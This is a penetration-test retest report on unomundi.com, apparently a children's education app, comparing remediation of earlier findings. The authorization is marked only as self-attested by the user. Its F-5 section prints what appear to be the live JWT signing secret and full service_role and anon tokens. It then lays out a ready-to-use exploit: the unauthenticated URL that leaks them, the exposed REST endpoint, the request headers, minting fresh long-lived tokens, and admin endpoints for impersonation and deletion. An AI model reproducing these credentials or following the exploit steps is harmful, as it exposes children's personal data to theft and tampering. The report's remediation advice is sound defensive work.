# unomundi.com — Retest / Rescan Delta

**Engagement:** unomundi.com pentest (authorized, self-attested by user)
**Original test:** 2026-05-05
**Rescan:** 2026-05-14
**Target:** unomundi.com (kids' education app, NL, ages 6-12)
**Scope:** Re-verify remediation of F-1, F-2, F-3 from the 2026-05-05 report. No SQL executed, no data exfiltrated, no authenticated requests made. HTTP HEAD/GET against management plane and static assets only.

## Executive summary

The vendor has done partial remediation. Network-layer hardening closed the Kong gateway ports on dev. Basic Auth was added in front of dev-supabase Studio UI. **The headline finding (unauthenticated self-hosted Supabase Studio on the production-named host) is unchanged, and a new critical disclosure has been confirmed: the project's `jwt_secret`, the pre-minted `service_role` JWT, and the `anon` JWT are all returned by an unauthenticated endpoint and the service_role JWT is valid until 2031-03-02.**

Effect: an unauthenticated remote attacker can today obtain a 5-year service_role bearer token for the project from a single public HTTP GET. No forging, no cracking, no auth needed.

## Findings table

| ID    | Title                                                              | Severity  | 2026-05-05 status        | 2026-05-14 status                            | Delta              |
|-------|--------------------------------------------------------------------|-----------|--------------------------|----------------------------------------------|--------------------|
| F-1a  | Studio publicly accessible on supabase.unomundi.com                | Critical  | Open, unauth             | Open, unauth (unchanged)                     | Not remediated     |
| F-1b  | Studio publicly accessible on dev-supabase.unomundi.com            | Critical  | Open, unauth             | HTTP Basic Auth on Studio paths only         | Partial            |
| F-2   | Kong API gateway exposed on dev-supabase:8000 / :8443              | High      | Open                     | TCP refused / timeout                        | Remediated         |
| F-3   | Prod admin SPA hardcodes dev-supabase as backend                   | High      | Open                     | Unchanged, same bundle hash references dev   | Not remediated     |
| F-4   | PostgREST `/rest/v1/` on dev-supabase reachable without basic auth | High      | Not separately tracked   | Open, returns OpenAPI schema (251 KB)        | Newly itemised     |
| F-5   | jwt_secret + service_role JWT + anon JWT leaked unauthenticated    | Critical  | Not previously found     | Open, valid through 2031-03-02               | **New critical**   |
| F-6   | api.unomundi.com Swagger UI exposed at /docs                       | Medium    | 404 (not catalogued)     | 200, Scalar API reference                    | New surface        |

## F-5 deep dive: how the JWT leak works in practice

### The leak

Unauthenticated request:

```
GET https://supabase.unomundi.com/api/platform/projects/default/settings
```

Response (HTTP 200, `application/json`, 977 bytes), abridged:

```json
{
  "app_config": {
    "db_schema": "public",
    "endpoint": "100.52.182.111:8000",
    "storage_endpoint": "100.52.182.111:8000",
    "protocol": "http"
  },
  "db_host": "localhost",
  "db_port": 5432,
  "db_user": "postgres",
  "db_name": "postgres",
  "jwt_secret": "vG3d9Z2h8aW4fK1sJ7YvL5pR6xQ0tB9eD3yF6kL1mN4oP2qR",
  "service_api_keys": [
    {"name": "service_role key", "tags": "service_role",
     "api_key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIiwiaXNzIjoic3VwYWJhc2UiLCJpYXQiOjE3NzI1NjU3NzMsImV4cCI6MTkzMDI0NTc3M30.HNUToHRtiGoRztMU6Bpja62fXNOaCqaDDKL6n9Ru16Q"},
    {"name": "anon key", "tags": "anon",
     "api_key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYW5vbiIsImlzcyI6InN1cGFiYXNlIiwiaWF0IjoxNzcyNTY1NzczLCJleHAiOjE5MzAyNDU3NzN9.-f3JG6tjVe9OcclTXQ9Mb7ApDwbLuWVD6G8h9L-eWEI"}
  ]
}
```

Decoded service_role JWT:

```
header  : {"alg":"HS256","typ":"JWT"}
payload : {"role":"service_role","iss":"supabase","iat":1772565773,"exp":1930245773}
iat     : 2026-03-03T19:22:53Z
exp     : 2031-03-02T19:22:53Z   (4 years 9 months remaining)
```

### What service_role grants on a Supabase backend

In a self-hosted Supabase stack, `service_role` is the privilege tier that bypasses all Row Level Security policies and connects to PostgREST with the equivalent of a superuser-scoped Postgres role. Anything the database schema can express is reachable by the bearer, including:

- Reading every row of every table, including `guardian_*`, `consent_records`, `explorer_profiles` and any auth.* tables.
- Inserting, updating, deleting rows.
- Calling RPC functions (including any that wrap privileged operations).
- On the GoTrue admin endpoints, creating users, resetting passwords, minting impersonation tokens.
- On Storage, reading or deleting any object in any bucket regardless of bucket policy.

### Step-by-step practical exploit (post-leak)

1. Attacker pulls the service_role JWT with one anonymous HTTP GET to `/api/platform/projects/default/settings` on supabase.unomundi.com. No auth, no credentials, no rate-limit observed.
2. Attacker resolves a reachable Supabase REST endpoint. Two options are currently exposed:
   - **dev-supabase.unomundi.com/rest/v1/** — confirmed reachable from the public internet (HTTP 200, returns full OpenAPI schema for 59 tables). The nginx Basic Auth rule does not cover this path.
   - The internal Kong at 100.52.182.111:8000 is RFC1918 / VPC-internal and would need a pivot. The public path above is sufficient.
3. Attacker sends a request such as `GET https://dev-supabase.unomundi.com/rest/v1/<table>` with two headers:
   ```
   apikey:        <leaked service_role JWT>
   Authorization: Bearer <leaked service_role JWT>
   ```
   PostgREST verifies the JWT signature using `jwt_secret` (HS256), reads `role: service_role` from the claims, switches the Postgres session role accordingly, and bypasses every RLS policy on the queried relation.
4. From there, every GDPR-K relevant table on this children's app is readable. Writes are also possible.

### Why the secret leak is a *separate* problem from the token leak

If the operator rotates the two pre-minted JWTs but does not remove the unauthenticated `/api/platform/projects/default/settings` endpoint, the attacker can still:

- Read the rotated `jwt_secret` from the same endpoint.
- Mint a brand-new service_role JWT locally with a 10-year `exp` using HS256 and the leaked secret.
- Continue access indefinitely.

Both classes of credential are reachable in the same response, so neither rotation alone fixes the exposure. The endpoint itself must stop being publicly reachable.

### Other surfaces the leaked credentials unlock

| Endpoint family                              | What the service_role JWT does                                |
|----------------------------------------------|---------------------------------------------------------------|
| `/rest/v1/<table>` (PostgREST)               | Read/write every table, ignore RLS                            |
| `/rest/v1/rpc/<fn>` (PostgREST RPC)          | Invoke any database function regardless of grant              |
| `/auth/v1/admin/users` (GoTrue admin)        | Enumerate, create, delete users; reset passwords              |
| `/auth/v1/admin/generate_link` (GoTrue)      | Mint magic-link or recovery tokens for any user (impersonate) |
| `/storage/v1/object/<bucket>/<path>`         | Read or delete any object in any bucket                       |
| `/pg/*` and `/realtime/*` (where exposed)    | Database event streaming, schema introspection                |

## F-3 evidence: admin still points at dev backend

The bundle served at `https://admin.unomundi.com/assets/index-LVG8KGiM.js` (1,476,471 bytes, served 2026-04-27, still the active script per `index.html`) contains exactly one production-side Supabase URL: `https://dev-supabase.unomundi.com`. Build-time env literals visible in the bundle include `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY`, `VITE_BACKEND_URL`. No prod-only Supabase host exists.

Operationally, admins logging in at admin.unomundi.com are talking to the dev backend, whose data API (`/rest/v1/`) is publicly reachable from the internet, whose Basic Auth covers only the Studio UI, and whose JWTs are the ones leaked above.

## F-2 evidence: Kong ports closed

```
$ curl -I https://dev-supabase.unomundi.com:8000/
curl: (7) Failed to connect ... Couldn't connect to server

$ curl -I https://dev-supabase.unomundi.com:8443/
curl: (7) Failed to connect ... Couldn't connect to server
```

This closes the previous direct-Kong-on-the-internet path. The data plane is still reachable via the nginx vhost on port 443, so this is hardening, not full mitigation.

## Recommendations, ordered by blast radius

1. **Rotate `jwt_secret` and re-mint both service_role and anon JWTs immediately.** Treat the 2026-03-03 keypair as fully burned. Any code or integration holding the old keys needs to be updated as part of rotation.
2. **Remove public reachability of `supabase.unomundi.com` and `dev-supabase.unomundi.com`.** Self-hosted Supabase Studio is a management plane; it should live behind a VPN, SSO, or IP allowlist, never a public hostname. The current Basic Auth on dev-supabase is a single shared password protecting a privileged surface and does not cover `/rest/v1/`.
3. **Repoint `admin.unomundi.com` at a production Supabase project.** A separate prod project with separate JWT keys and an isolated database. Rebuild the admin SPA with a prod-only `VITE_SUPABASE_URL`.
4. **Audit `/api/platform/*` exposure on both Supabase hosts.** The Next.js Studio app ships a platform API that returns infrastructure secrets when it believes it is on localhost. It must not be reachable unauthenticated.
5. **Database log review for the period 2026-03-03 to today.** With a 4-year-old service_role JWT and an unauthenticated leak path, prior abuse is plausible and must be checked. Pull Postgres `pg_stat_statements`, GoTrue audit logs, Storage access logs for anomalies, especially any reads of `guardian_*` or `consent_records` from non-application source IPs.
6. **GDPR Art. 33 notification clock.** If step 5 surfaces evidence of unauthorised access to children's PII, the 72h notification to the AP (Autoriteit Persoonsgegevens) applies. Coordinate with DPO before the 72h window closes.
7. **Remove or auth-gate `api.unomundi.com/docs`** (Scalar API reference) unless intentional for the public.

## Evidence index

All raw HTTP responses captured 2026-05-14 between 14:11 and 14:23 UTC, stored in `./evidence/`:

| File                                          | Content                                                |
|-----------------------------------------------|--------------------------------------------------------|
| 01-supabase-root.txt                          | 307 redirect to /project/default (no auth)             |
| 02-supabase-profile.txt                       | 200, default johndoe demo profile                      |
| 03-supabase-project.txt                       | 200, Default Project metadata                          |
| 04-supabase-settings-JWT-LEAK.txt             | 200, jwt_secret + service_role + anon JWTs            |
| 05-dev-supabase-root-401.txt                  | 401 Basic Auth (Restricted Studio)                     |
| 06-dev-supabase-profile-401.txt               | 401 Basic Auth                                         |
| 07-dev-supabase-rest-OPEN.txt                 | 200 OpenAPI JSON, basic auth absent                    |
| 08-kong-ports-closed.txt                      | TCP refused on 8000/8443                               |
| 09-admin-index.txt                            | 200, references index-LVG8KGiM.js                      |
| 10-admin-bundle.js                            | 1.47 MB bundle, contains dev-supabase URL              |
| 11-api-health.txt                             | 200 from api.unomundi.com/health                       |
| 12-api-docs.txt                               | 200 Scalar UI from api.unomundi.com/docs               |

## Methodology and limits

This rescan was performed entirely with anonymous HTTP HEAD and GET requests against documented Supabase Studio platform endpoints and against the admin SPA. No authenticated requests were made. No SQL was executed. No user records were read. No data was exfiltrated beyond the management-plane responses cited above. The leaked JWTs were not used against any endpoint.

The structural proof in this report is sufficient to characterise the remediation state; further proof would require crossing into active exploitation, which is out of scope.
